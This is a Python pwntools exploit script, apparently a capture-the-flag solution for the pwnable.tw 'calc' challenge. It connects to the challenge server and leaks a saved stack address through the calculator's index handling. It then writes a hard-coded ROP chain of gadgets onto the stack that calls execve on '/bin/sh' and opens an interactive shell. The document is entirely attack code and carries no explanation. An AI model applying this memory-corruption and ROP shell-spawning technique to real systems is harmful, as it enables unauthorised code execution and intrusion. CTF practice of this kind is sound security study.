from pwn import *
elf = context.binary = ELF("./calc")
r = elf.process()
libc = elf.libc
r = remote("chall.pwnable.tw", 10100)
ROP = ['+361', '+362', '+363', '+364', '+365', '+366', '+367', '+368', '+369']

payload =   [   0x0805c34b, #pop eax ; ret
                0xb,        #execve()
                0x080701d0, #pop edx ; pop ecx ; pop ebx ; ret
                0x0,        # 0x0
                0x0,        # 0x0
                0x0,        # will change after  <===
                0x08049a21, # int 0x80
                0x6e69622f, # "/bin"
                0x0068732f  # "/sh\x0"
            ]

r.recv()
r.sendline('+360')
prev_ebp = int(r.recv(1024))
payload[5] = prev_ebp

print(payload)

for i in range(len(payload)):
    log.success(f"Target: {hex(payload[i])}")
    r.sendline(ROP[i])
    leak = int(r.recv(1024))
    log.success(f"Addr Leak: {hex(leak)}")
    offset = payload[i] - leak
    log.success(f"Offset: {hex(offset)}")
    g = f"{ROP[i]}{offset:+}"
    r.sendline(g)
    print(f"==> {hex(int(r.recv(1024)))}")
    log.success("Overrite done!!!")

# gdb.attach(r, '''
#     b*calc+37\n
#     b*calc+186\n
#     c
# ''')
r.send("\n")
r.interactive()